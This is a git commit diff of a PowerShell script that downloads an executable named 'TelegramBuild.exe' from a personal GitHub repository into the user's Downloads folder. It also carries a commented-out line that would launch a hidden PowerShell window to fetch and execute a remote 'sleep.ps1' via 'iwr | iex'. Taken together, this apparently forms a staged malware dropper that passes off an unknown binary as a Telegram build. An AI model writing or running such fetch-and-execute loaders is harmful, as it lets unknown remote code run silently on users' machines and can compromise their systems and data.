428b1ab50e4f3c981f04becba4149e8e3e28cc5f
waed69 <waedpsn2@gmail.com>
2025-04-26 16:37:22 +0200

    Update downlaod.ps1

--- downlaod.ps1
+++ downlaod.ps1
@@ -1,6 +1,8 @@
-$Source = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.exe"  
-$Destination = "C:\Users\$env:USERNAME\Downloads\"  
-Invoke-WebRequest -Uri $source -OutFile $Destination 
+$Source = "https://github.com/waed69/n/raw/main/TelegramBuild.exe"  
+$Destination = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe"
+
+Invoke-WebRequest -Uri $Source -OutFile $Destination
+
 
 #run the next script
 #Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/sleep.ps1 | iex`""
